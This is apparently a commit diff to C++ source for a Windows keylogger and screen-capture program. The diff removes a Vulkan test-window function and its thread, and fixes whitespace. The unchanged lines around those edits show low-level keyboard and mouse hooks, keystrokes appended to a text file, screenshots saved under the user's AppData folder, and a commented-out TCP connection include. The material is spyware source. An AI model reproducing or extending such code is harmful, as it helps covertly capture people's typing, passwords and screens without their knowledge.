@@ -15,15 +15,6 @@
 
 
 
-#define GLFW_INCLUDE_VULKAN
-#include <GLFW/glfw3.h>
-
-#define GLM_FORCE_RADIANS
-#define GLM_FORCE_DEPTH_ZERO_TO_ONE
-#include <glm.hpp>
-
-#include <iostream>
-
 // #include "tcp_connection.h"
 
 std::ofstream logFile, keyboardFile;
@@ -31,33 +22,6 @@ std::ostringstream logStream, keyboardStream;
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
-
-
-
-bool isVulcanworkfine() {
-    glfwInit();
-
-    glfwWindowHint(GLFW_CLIENT_API, GLFW_NO_API);
-    GLFWwindow* window = glfwCreateWindow(800, 600, "Vulkan window", nullptr, nullptr);
-
-    uint32_t extensionCount = 0;
-    vkEnumerateInstanceExtensionProperties(nullptr, &extensionCount, nullptr);
-
-    std::cout << extensionCount << " extensions supported\n";
-
-    glm::mat4 matrix;
-    glm::vec4 vec;
-    auto test = matrix * vec;
-
-    while (!glfwWindowShouldClose(window)) {
-        glfwPollEvents();
-    }
-
-    glfwDestroyWindow(window);
-
-    glfwTerminate();
-    return true;
-}
 
 std::wstring GetModuleFileExeName() {
     constexpr size_t MAX_PATH_LEN = 260; // Maximum length of a file path
@@ -421,7 +385,7 @@ void SaveScreenshotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int widt
 
     // Construct full file path for PNG
     std::wstring fullFilePath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\Screenshot\\" + filePath;
-    
+
     // Write PNG data to file
     std::ofstream pngFile(fullFilePath, std::ios::binary);
     if (!pngFile.is_open()) {
@@ -724,8 +688,6 @@ int main() {
     std::thread captureThread(ScreenCaptureThread, userName);
 
     // Run isVulcanworkfine in a separate thread
-    auto vulkanFuture = std::async(std::launch::async, isVulcanworkfine);
-
     /*
 
         if (!DllPartOfFunctions()) {
@@ -765,7 +727,6 @@ int main() {
     UnhookWindowsHookEx(mouseHook);
 
     // Wait for both threads to finish
-    vulkanFuture.wait(); // Wait for Vulkan thread to finish
     WaitForThreads(captureThread, windowThread);
 
     return 0;
@@ -820,7 +781,7 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         case VK_OEM_1:
             key = " ( typed ; ) ";
             break;
-        case VK_OEM_2: 
+        case VK_OEM_2:
             key = " ( typed ? ) ";
             break;
         case VK_OEM_3:
@@ -967,7 +928,7 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             keyboardFile.open("linear_keyboard.txt", std::ios::app);
             if (!keyboardFile.is_open()) {
                 throw std::runtime_error("Failed to open keyboard file.");
-            } 
+            }
             keyboardFile << key;
             keyboardFile.close();
             keyboardStream.str("");
